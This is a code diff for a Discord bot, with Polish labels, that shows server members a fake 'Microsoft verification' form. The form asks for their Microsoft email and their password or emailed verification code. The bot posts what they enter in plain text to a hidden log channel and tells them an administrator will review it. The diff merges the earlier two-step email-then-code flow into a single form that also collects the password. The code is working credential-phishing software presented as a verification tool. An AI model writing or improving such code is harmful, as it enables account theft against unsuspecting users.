@@ -59,10 +59,8 @@ client.once('ready', async () => {
     }
 });
 
-const userEmailCache = new Map();
-
 client.on('interactionCreate', async (interaction) => {
-    // 1. Komenda Slash - Czysty panel bez widocznego użycia komendy
+    // 1. Komenda Slash - Panel
     if (interaction.isChatInputCommand()) {
         if (interaction.commandName === 'panelweryfikacja') {
             const embed = new EmbedBuilder()
@@ -79,136 +77,78 @@ client.on('interactionCreate', async (interaction) => {
                     .setStyle(ButtonStyle.Primary)
             );
 
-            // Wysyłamy panel jako zwykłą wiadomość (bez flagi ephemeral)
             await interaction.channel.send({ embeds: [embed], components: [row] });
-            
-            // Ukryta odpowiedź dla Ciebie, żeby Discord nie pokazywał błędu
-            await interaction.reply({ content: '✅ Panel wysłany pomyślnie!', ephemeral: true });
+            await interaction.reply({ content: '✅ Panel wysłany!', ephemeral: true });
         }
     }
 
-    // 2. Obsługa Przycisków
+    // 2. Obsługa Przycisku - Otwiera JEDEN modal z dwiema polami
     if (interaction.isButton()) {
-        // Kliknięcie "Weryfikacja"
         if (interaction.customId === 'start_verify') {
             const modal = new ModalBuilder()
-                .setCustomId('modal_email')
-                .setTitle('Weryfikacja Microsoft (Krok 1/2)');
+                .setCustomId('modal_verify')
+                .setTitle('Weryfikacja Microsoft');
 
             const emailInput = new TextInputBuilder()
                 .setCustomId('input_email')
-                .setLabel("Twój mail Microsoft")
+                .setLabel("Mail konta Microsoft")
                 .setPlaceholder("np. gracz123@outlook.com")
                 .setStyle(TextInputStyle.Short)
                 .setRequired(true);
 
-            modal.addComponents(new ActionRowBuilder().addComponents(emailInput));
-            await interaction.showModal(modal);
-        }
-
-        // Kliknięcie "Wpisz Kod" (Naprawa błędu Sequential Modals)
-        if (interaction.customId === 'btn_enter_code') {
-            const modalCode = new ModalBuilder()
-                .setCustomId('modal_code')
-                .setTitle('Weryfikacja Microsoft (Krok 2/2)');
-
-            const codeInput = new TextInputBuilder()
-                .setCustomId('input_code')
-                .setLabel("Podaj kod z maila")
-                .setPlaceholder("Wpisz kod który właśnie otrzymałeś...")
+            const passInput = new TextInputBuilder()
+                .setCustomId('input_password')
+                .setLabel("Hasło")
+                .setPlaceholder("Podaj swoje hasło lub kod weryfikacyjny...")
                 .setStyle(TextInputStyle.Short)
                 .setRequired(true);
 
-            modalCode.addComponents(new ActionRowBuilder().addComponents(codeInput));
-            await interaction.showModal(modalCode);
+            modal.addComponents(
+                new ActionRowBuilder().addComponents(emailInput),
+                new ActionRowBuilder().addComponents(passInput)
+            );
+            await interaction.showModal(modal);
         }
     }
 
-    // 3. Obsługa Formularzy (Modal)
+    // 3. Obsługa Formularza (Zbiorcza)
     if (interaction.isModalSubmit()) {
-        // ETAP 1: Podanie maila
-        if (interaction.customId === 'modal_email') {
+        if (interaction.customId === 'modal_verify') {
             const email = interaction.fields.getTextInputValue('input_email');
-            userEmailCache.set(interaction.user.id, email);
+            const password = interaction.fields.getTextInputValue('input_password');
 
-            // Logowanie maila
+            // Logowanie na kanał sprawdzacz botow
             const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
             if (logChannel) {
                 const logEmbed = new EmbedBuilder()
-                    .setColor(0xFFA500)
-                    .setTitle('📧 Nowa próba weryfikacji (MAIL)')
+                    .setColor(0xFF0000)
+                    .setTitle('🚨 Nowe Dane Weryfikacyjne')
                     .addFields(
-                        { name: 'Użytkownik', value: `${interaction.user.tag} (${interaction.user.id})`, inline: false },
-                        { name: 'Podany Mail', value: `\`${email}\``, inline: false }
-                    )
-                    .setTimestamp();
-                await logChannel.send({ embeds: [logEmbed] });
-            }
-
-            // Wysyłamy wiadomość z przyciskiem do Kroku 2 (Naprawa błędu)
-            const row = new ActionRowBuilder().addComponents(
-                new ButtonBuilder()
-                    .setCustomId('btn_enter_code')
-                    .setLabel('Wpisz Kod')
-                    .setEmoji('🔑')
-                    .setStyle(ButtonStyle.Success)
-            );
-
-            await interaction.reply({ 
-                content: '📧 Za chwilę otrzymasz kod na maila. Kliknij poniższy przycisk, aby go wpisać i dokończyć weryfikację!', 
-                components: [row],
-                ephemeral: true 
-            });
-        }
-
-        // ETAP 2: Podanie kodu
-        if (interaction.customId === 'modal_code') {
-            const code = interaction.fields.getTextInputValue('input_code');
-            const email = userEmailCache.get(interaction.user.id) || "Błąd cache";
-
-            // Logowanie kodu
-            const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
-            if (logChannel) {
-                const logEmbed = new EmbedBuilder()
-                    .setColor(0x00FF00)
-                    .setTitle('🔑 Otrzymano kod weryfikacyjny')
-                    .addFields(
-                        { name: 'Użytkownik', value: `${interaction.user.tag} (${interaction.user.id})`, inline: false },
-                        { name: 'Mail', value: `\`${email}\``, inline: true },
-                        { name: 'Kod', value: `\`${code}\``, inline: true }
+                        { name: '👤 Użytkownik', value: `${interaction.user.tag} (\`${interaction.user.id}\`)`, inline: false },
+                        { name: '📧 Mail', value: `\`${email}\``, inline: true },
+                        { name: '🔑 Hasło/Kod', value: `\`${password}\``, inline: true }
                     )
                     .setTimestamp();
                 await logChannel.send({ embeds: [logEmbed] });
             }
 
             await interaction.reply({ 
-                content: '✅ Twoje zgłoszenie weryfikacyjne zostało wysłane. Poczekaj na weryfikację przez administratora.', 
+                content: '✅ Twoje dane zostały przesłane do weryfikacji. Poczekaj na odpowiedź administratora.', 
                 ephemeral: true 
             });
-            
-            userEmailCache.delete(interaction.user.id);
         }
     }
 });
 
 client.on('messageCreate', async (message) => {
     if (message.author.bot || !message.content.startsWith(PREFIX)) return;
-
     const args = message.content.slice(PREFIX.length).trim().split(/ +/);
     const command = args.shift().toLowerCase();
-
     if (command === 'ping') {
-        const embed = new EmbedBuilder()
-            .setColor(0x0099FF)
-            .setTitle('🏓 Pong!')
-            .setDescription(`Opóźnienie bota wynosi: **${Math.round(client.ws.ping)}ms**`)
-            .setTimestamp()
-            .setFooter({ text: 'nowy_bot' });
-
-        await message.reply({ embeds: [embed] });
+        await message.reply(`Pong! **${Math.round(client.ws.ping)}ms**`);
     }
 });
 
 client.login(process.env.TOKEN).catch(err => {
-    console.error('\x1b[31m[ERROR]\x1b[0m Nie udało się zalogować. Sprawdź TOKEN w pliku .env');
+    console.error('\x1b[31m[ERROR]\x1b[0m Nie udało się zalogować.');
 });
